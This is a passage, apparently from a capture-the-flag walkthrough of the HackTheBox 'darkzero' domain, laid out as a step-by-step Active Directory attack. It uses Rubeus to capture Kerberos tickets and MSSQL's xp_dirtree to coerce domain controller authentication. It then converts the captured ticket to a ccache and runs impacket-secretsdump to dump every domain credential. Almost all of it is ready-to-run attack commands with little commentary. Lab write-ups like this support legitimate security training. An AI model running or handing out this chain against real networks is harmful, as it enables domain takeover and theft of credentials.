
```
Rubeus.exe tgtdeleg /nowrap
```

For machine accouts, used to get a TGT which then converted into ticket and dump using secretdump

## Inside a host

We can use Rubeus to listen to the LSASS memory with system privileges, and access the SMB share of DC02 from MSSQL Service

```
Rubeus.exe monitor /interval:5 /nowrap
```

Call the connection from mssql :
```
xp_dirtree '\\DC02.darkzero.ext\sfsdafasd'
```

>When the  SQL Server process on DC01 attempts to access that SMB path, it requests a Kerberos service ticket (TGS) for the target or falls back to NTLM. Rubeus picks up the resulting ticket or NTLM response and prints it (base64). This is the step that produces the “ticket”

Save the ticket as `ticket.bs4.kirbi`

We need to decode it in our host machine :

```
# save base64 output to file, then decode:
cat ticket.bs4.kirbi | base64 -d > ticket.kirbi

# convert to a ccache file (ticket conversion tool)
python ticketConverter.py ticket.kirbi dc01_admin.ccache

# export the ccache for current session
export KRB5CCNAME=dc01_admin.ccache

# verify cached tickets
klist
```

then we can dump all 

```
impacket-secretsdump -k -no-pass 'darkzero.htb/DC01$@DC01.darkzero.htb'
```

```
KRB5CCNAME=dc01_admin.ccache impacket-secretsdump -k -no-pass 'darkzero.htb/DC01$@DC01.darkzero.htb'
```

